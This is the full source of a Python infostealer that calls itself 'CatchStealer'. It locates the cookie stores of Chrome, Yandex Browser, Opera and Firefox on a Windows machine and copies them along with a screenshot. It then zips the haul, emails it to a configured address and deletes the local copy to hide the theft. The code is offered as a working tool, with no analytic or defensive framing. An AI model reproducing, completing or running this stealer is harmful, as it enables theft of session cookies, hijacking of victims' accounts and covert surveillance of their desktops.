enabledLog = True
MailToLog = ""
MailPassword = ""
getotherlog = True
logfilename = ""
removelog = True

import getpass
import os
import time
from modules import otherlogging
from modules import fileutils
from modules import mailutils

otherlogging.createLoggingDirectory()

def returnFirefoxCookie():
        cookies = "C:/Users/" + getpass.getuser() + "/AppData/Roaming/Mozilla/Firefox/Profiles/"
        cookie_list = os.listdir(cookies)
        for cookieList in cookie_list:
                if ".default-release" in cookieList:
                                return cookies + cookieList + "/cookies.sqlite"

chrome = "C:/Users/" + getpass.getuser() + "/AppData/Local/Google/Chrome/User Data/Default/Cookies"
yandex = "C:/Users/" + getpass.getuser() + "/AppData/Local/Yandex/YandexBrowser/User Data/Default/Cookies"
opera = "C:/Users/" + getpass.getuser() + "/AppData/Roaming/Opera Software/OperaStable/Cookies"
firefox = returnFirefoxCookie()
chromeRes = False
yandexRes = False
operaRes = False
firefoxRes = False

if enabledLog == True:
        print("- - -  CatchStealer - - -\n- - - By CatchThels - - -\n\n")
        print(time.strftime("%H:%m:%S") + ": Detecting cookie...")
        print("-----------------------------")
if os.path.exists(chrome):
        chromeRes = True
        if enabledLog == True:
                print("Google Chrome: DETECTED")
                fileutils.copyFile(chrome, otherlogging.directory + "ChromeCookie")
if os.path.exists(yandex):
        yandexRes = True
        if enabledLog == True:
                print("Yandex Browser: DETECTED")
                fileutils.copyFile(yandex, otherlogging.directory + "YandexCookie")
if os.path.exists(opera):
        operaRes = True
        if enabledLog == True:
                print("Opera: DETECTED")
                fileutils.copyFile(opera, otherlogging.directory + "OperaCookie")
if os.path.exists(firefox):
        firefoxRes = True
        if enabledLog == True:
                print("Firefox: DETECTED")
                fileutils.copyFile(firefox, otherlogging.directory + "FirefoxCookie")

if enabledLog == True:
        print("-----------------------------")
        print("Result of stealer:\n> Chrome: " + str(chromeRes) + "\n> Y. Browser: " + str(yandexRes) + "\n> Opera: " + str(operaRes) + "\n> Firefox: " + str(firefoxRes))
if getotherlog == True:
        otherlogging.getScreenshot()

if enabledLog == True:
        print("Saved screenshot!")

if enabledLog == True:
        print("Saving all detected logs")
fileutils.createZipFile(logfilename)

if enabledLog == True:
        print("Saved screenshot!")

if enabledLog == True:
        print("Sharing log file")
mailutils.sendLog(MailToLog, MailPassword, "C:/Users/" + getpass.getuser() + "/AppData/Local/" + logfilename, getotherlog)
if enabledLog == True:
        print("Done.")

if removelog == True:
        fileutils.removeFile("C:/Users/" + getpass.getuser() + "/AppData/Local/" + logfilename)